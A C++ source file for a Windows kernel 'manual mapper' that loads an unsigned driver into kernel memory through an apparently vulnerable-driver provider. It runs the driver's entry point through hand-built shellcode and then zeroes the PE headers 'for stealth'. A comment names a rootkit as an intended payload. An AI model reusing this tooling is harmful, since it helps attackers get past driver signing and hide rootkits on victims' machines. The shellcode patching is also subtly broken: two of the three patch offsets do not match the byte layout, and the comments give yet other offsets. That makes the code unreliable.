/**
 * @file ManualMapper.cpp
 * @author Gregory King
 * @date August 14, 2025
 * @brief This file contains the implementation of the ManualMapper class.
 *
 * Implements the full logic for manual driver mapping, including kernel
 * memory allocation, PE header parsing, import resolution via kernel
 * export table parsing, base relocation processing, and calling the
 * driver's entry point.
 */

#include "ManualMapper.h"
#include "Utils.h"
#include <fstream>
#include <iostream>

namespace KernelMode {

    ManualMapper::ManualMapper(std::shared_ptr<Providers::IProvider> provider)
        : provider(std::move(provider)) {}
    
    ManualMapper::~ManualMapper() {
        Cleanup();
    }
    
    void ManualMapper::Cleanup() {
        // Free all tracked kernel memory allocations
        for (const auto& alloc : allocations) {
            if (alloc.address && alloc.size > 0) {
                provider->FreeKernelMemory(alloc.address, alloc.size);
                std::wcout << L"[+] Freed kernel memory at 0x" << std::hex << alloc.address 
                           << L" (size: " << std::dec << alloc.size << L" bytes)" << std::endl;
            }
        }
        allocations.clear();
    }

    bool ManualMapper::ResolveImports(std::vector<char>& imageBuffer) {
        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(imageBuffer.data());
        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(imageBuffer.data() + dosHeader->e_lfanew);

        auto importDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        if (importDirRva == 0) return true; // No imports

        auto importDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(imageBuffer.data() + importDirRva);

        while (importDescriptor->Name) {
            char* moduleName = imageBuffer.data() + importDescriptor->Name;
            uintptr_t moduleBase = Utils::GetKernelModuleBase(moduleName);
            if (!moduleBase) {
                std::wcerr << L"[-] Could not find required kernel module: " << moduleName << std::endl;
                return false;
            }

            auto thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(imageBuffer.data() + importDescriptor->OriginalFirstThunk);
            auto iat = reinterpret_cast<PIMAGE_THUNK_DATA64>(imageBuffer.data() + importDescriptor->FirstThunk);

            while (thunk->u1.AddressOfData) {
                uintptr_t functionAddress = 0;
                if (IMAGE_SNAP_BY_ORDINAL64(thunk->u1.Ordinal)) {
                    std::wcerr << L"[-] Ordinal imports are not supported." << std::endl;
                    return false;
                } else {
                    auto importByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(imageBuffer.data() + thunk->u1.AddressOfData);
                    // Convert char* moduleName to string for compatibility
                    functionAddress = Utils::GetKernelExport(moduleBase, importByName->Name, std::string(moduleName));
                }

                if (!functionAddress) {
                    auto importByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(imageBuffer.data() + thunk->u1.AddressOfData);
                    std::wcerr << L"[-] Could not resolve import: " << importByName->Name << " in " << moduleName << std::endl;
                    return false;
                }

                iat->u1.Function = functionAddress;
                thunk++;
                iat++;
            }
            importDescriptor++;
        }
        return true;
    }

    void ManualMapper::ApplyRelocations(std::vector<char>& imageBuffer, uintptr_t delta) {
        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(imageBuffer.data());
        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(imageBuffer.data() + dosHeader->e_lfanew);

        auto relocDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        if (relocDirRva == 0 || delta == 0) return;

        auto relocBlock = reinterpret_cast<PIMAGE_BASE_RELOCATION>(imageBuffer.data() + relocDirRva);
        while (relocBlock->VirtualAddress) {
            DWORD count = (relocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            auto relocEntry = reinterpret_cast<PWORD>((char*)relocBlock + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD i = 0; i < count; ++i, ++relocEntry) {
                if ((*relocEntry >> 12) == IMAGE_REL_BASED_DIR64) {
                    auto patchAddress = reinterpret_cast<uintptr_t*>(imageBuffer.data() + relocBlock->VirtualAddress + (*relocEntry & 0xFFF));
                    *patchAddress += delta;
                }
            }
            relocBlock = reinterpret_cast<PIMAGE_BASE_RELOCATION>((char*)relocBlock + relocBlock->SizeOfBlock);
        }
    }

    uintptr_t ManualMapper::MapDriver(const std::wstring& driverPath) {
        std::ifstream file(driverPath, std::ios::binary | std::ios::ate);
        if (!file.is_open()) {
            std::wcerr << L"[-] Failed to open driver file: " << driverPath << std::endl;
            return 0;
        }

        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        std::vector<char> imageBuffer(static_cast<size_t>(size));
        file.read(imageBuffer.data(), size);
        file.close();

        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(imageBuffer.data());
        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(imageBuffer.data() + dosHeader->e_lfanew);

        // Calculate total memory needed for the driver image
        DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;
        std::wcout << L"[*] Allocating " << imageSize << L" bytes of kernel memory for driver image" << std::endl;

        // Use provider to allocate executable kernel memory
        uintptr_t physicalAddress = 0;
        uintptr_t remoteImageBase = provider->AllocateKernelMemory(imageSize, &physicalAddress);
        
        if (!remoteImageBase) {
            std::wcerr << L"[-] Failed to allocate kernel memory for driver image" << std::endl;
            return 0;
        }
        
        // Track allocation for cleanup
        allocations.push_back({remoteImageBase, imageSize});

        std::wcout << L"[+] Allocated kernel memory at: 0x" << std::hex << remoteImageBase 
                   << L" (physical: 0x" << physicalAddress << L")" << std::dec << std::endl;

        // KDU/Mapping Fix: Create Local Mapped Image
        // We must map the sections to their Virtual Addresses locally to perform RVA-based fixups.
        std::vector<char> localImage(imageSize, 0);

        // Copy Headers
        memcpy(localImage.data(), imageBuffer.data(), ntHeaders->OptionalHeader.SizeOfHeaders);

        // Copy Sections
        auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++sectionHeader) {
            if (sectionHeader->SizeOfRawData > 0) {
                // Bounds check
                if (sectionHeader->VirtualAddress + sectionHeader->SizeOfRawData <= imageSize &&
                    sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData <= imageBuffer.size()) {
                    memcpy(localImage.data() + sectionHeader->VirtualAddress, 
                           imageBuffer.data() + sectionHeader->PointerToRawData, 
                           sectionHeader->SizeOfRawData);
                }
            }
        }

        // Resolve Imports on the Local Mapped Image
        if (!ResolveImports(localImage)) {
            provider->FreeKernelMemory(remoteImageBase, imageSize);
            return 0;
        }

        // KDU COMPLIANCE: Copy PE Headers to Kernel Memory (Already copied to localImage)
        // Note: ResolveImports modifies localImage. We write the whole thing.
        
        uintptr_t delta = remoteImageBase - ntHeaders->OptionalHeader.ImageBase;
        ApplyRelocations(localImage, delta);
        
        // Write the FULL local mapped image to kernel memory
        // This copies headers and strings and all sections at once in correct layout.
        if (!provider->WriteKernelMemory(remoteImageBase, localImage.data(), imageSize)) {
            std::wcerr << L"[-] Failed to write driver image to kernel memory." << std::endl;
            provider->FreeKernelMemory(remoteImageBase, imageSize);
            return 0;
        }
        std::wcout << L"[+] Driver image written to kernel memory." << std::endl;

        /* Section copy loop removed - we wrote the whole image */

        uintptr_t entryPoint = remoteImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
        std::wcout << L"[+] Driver mapped to kernel address 0x" << std::hex << remoteImageBase << std::endl;
        std::wcout << L"[+] Entry point at 0x" << std::hex << entryPoint << std::endl;

        // KDU-style DriverEntry execution setup
        std::wcout << L"[*] Setting up DRIVER_OBJECT and executing DriverEntry..." << std::endl;
        
        // KDU COMPLIANCE: Enhanced Shellcode (Version 2)
        // Creates a fake DRIVER_OBJECT AND DRIVER_EXTENSION on the stack.
        // Critical for IoCreateDevice calls (like in SilentRK) to succeed without BSOD.
        
        BYTE driverEntryShellcode[] = {
            // --- Prologue ---
            0x48, 0x81, 0xEC, 0x00, 0x04, 0x00, 0x00,   // sub rsp, 1024 (Reserve ample stack)
            
            // --- Zero Memory (DriverObject + DriverExtension) ---
            // DriverObject at [rsp+0x40] (Size 0xA8)
            // DriverExtension at [rsp+0xF0] (Size 0x40) -> Total ~0x100 bytes to zero
            0x48, 0x8D, 0x7C, 0x24, 0x40,               // lea rdi, [rsp+0x40]
            0x48, 0x31, 0xC0,                           // xor rax, rax
            0x48, 0xB9, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 32 (32 qwords = 256 bytes, covers both)
            0xF3, 0x48, 0xAB,                           // rep stosq
            
            // --- Restore Pointers ---
            0x48, 0x8D, 0x4C, 0x24, 0x40,               // lea rcx, [rsp+0x40] -> ptr to DriverObject (RBX)
            0x48, 0x8D, 0x94, 0x24, 0xF0, 0x00, 0x00, 0x00, // lea rdx, [rsp+0xF0] -> ptr to DriverExtension
            
            // --- Link DriverExtension ---
            0x48, 0x89, 0x51, 0x30,                     // mov [rcx+0x30], rdx (DriverObject->DriverExtension = Extension)
            0x48, 0x89, 0x0A,                           // mov [rdx], rcx      (DriverExtension->DriverObject = DriverObject)
            
            // --- Set Driver Properties ---
            
            // 1. ImageBase (DriverStart at 0x18)
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, ImageBase (dynamic)
            0x48, 0x89, 0x41, 0x18,                     // mov [rcx+0x18], rax
            
            // 2. ImageSize (DriverSize at 0x20)
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, ImageSize (dynamic)
            0x48, 0x89, 0x41, 0x20,                     // mov [rcx+0x20], rax
            
            // --- Call DriverEntry ---
            0x48, 0x31, 0xD2,                           // xor rdx, rdx (RegistryPath = NULL)
            
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, DriverEntry (dynamic)
            0xFF, 0xD0,                                 // call rax
            
            // --- Epilogue ---
            0x48, 0x81, 0xC4, 0x00, 0x04, 0x00, 0x00,   // add rsp, 1024
            0xC3                                        // ret
        };

        // --- Shellcode Patching ---
        // New Offsets based on updated assembly:
        // Base:  Offset 58
        // Size:  Offset 72
        // Entry: Offset 92

        
        // Patch Shellcode (Offsets calculated for Shellcode V2)
        
        // ImageBase (Offset 0x32 = 50)
        *(uintptr_t*)&driverEntryShellcode[50] = remoteImageBase;
        
        // ImageSize (Offset 0x40 = 64)
        *(uintptr_t*)&driverEntryShellcode[64] = (uintptr_t)imageSize;
        
        // EntryPoint (Offset 0x51 = 81)
        *(uintptr_t*)&driverEntryShellcode[81] = entryPoint;
        
        // Allocating Memory for Shellcode


        // ALLOCATE MEMORY FOR SHELLCODE (KDU REMEDIATION)
        // We must store the shellcode in executable kernel memory, not user stack.
        uintptr_t shellcodePhys = 0;
        uintptr_t shellcodeExec = provider->AllocateKernelMemory(sizeof(driverEntryShellcode), &shellcodePhys);
        
        if (!shellcodeExec) {
             std::wcerr << L"[-] Failed to allocate kernel memory for shellcode." << std::endl;
             // Cleanup will handle freeing remoteImageBase
             Cleanup();
             return 0;
        }
        
        // Track shellcode allocation for cleanup
        allocations.push_back({shellcodeExec, sizeof(driverEntryShellcode)});
        
        if (!provider->WriteKernelMemory(shellcodeExec, driverEntryShellcode, sizeof(driverEntryShellcode))) {
             std::wcerr << L"[-] Failed to write shellcode to kernel memory." << std::endl;
             // Cleanup will handle freeing both allocations
             Cleanup();
             return 0;
        }
        
        std::wcout << L"[+] Copying shellcode to Kernel Memory at 0x" << std::hex << shellcodeExec << std::endl;
        
        // Use provider to execute the DriverEntry shellcode via system thread
        // Pass the KERNEL ADDRESS of the shellcode
        if (provider->CreateSystemThread(shellcodeExec, 0)) {
            std::wcout << L"[+] DriverEntry execution initiated via system thread" << std::endl;
        } else {
            std::wcerr << L"[-] Failed to create system thread for DriverEntry execution" << std::endl;
        }

        // Wait a bit for DriverEntry to run before wiping headers (avoid race condition)
        std::wcout << L"[*] Waiting for DriverEntry to initialize..." << std::endl;
        Sleep(2000);

        std::vector<char> zeroBuffer(ntHeaders->OptionalHeader.SizeOfHeaders, 0);
        provider->WriteKernelMemory(remoteImageBase, zeroBuffer.data(), zeroBuffer.size());
        std::wcout << L"[+] PE headers zeroed for stealth." << std::endl;

        return remoteImageBase;
    }
}